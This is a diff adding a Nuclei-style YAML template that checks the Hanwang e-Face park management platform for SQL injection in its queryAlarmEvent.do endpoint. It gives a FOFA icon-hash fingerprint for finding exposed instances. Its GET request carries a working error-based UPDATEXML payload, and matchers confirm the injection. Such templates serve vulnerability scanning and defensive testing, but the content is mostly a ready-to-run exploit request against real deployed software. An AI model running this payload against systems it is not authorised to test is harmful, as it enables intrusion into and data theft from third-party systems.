@@ -1,0 +1,32 @@
+id: poc-yaml-hw-e-face-pass-spmp-queryalarmevent-do-sqli
+info:
+  name: 汉王e脸通综合管理平台 queryAlarmEvent.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: e脸通智慧园区管理平台
+    fofa: icon_hash="1380907357"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /manage/alarm/queryAlarmEvent.do?order=/**/&columnKey=(UPDATEXML(2,CONCAT(0x7e,(SELECT+(ELT(1=1,md5({{t1}})))),0x7e),8))&recoToken=ZuZBOrvLG8M HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "XPATH syntax error"
+          - "java.sql.SQLException"
+          - "{{substr(t2, 0, 31)}}"
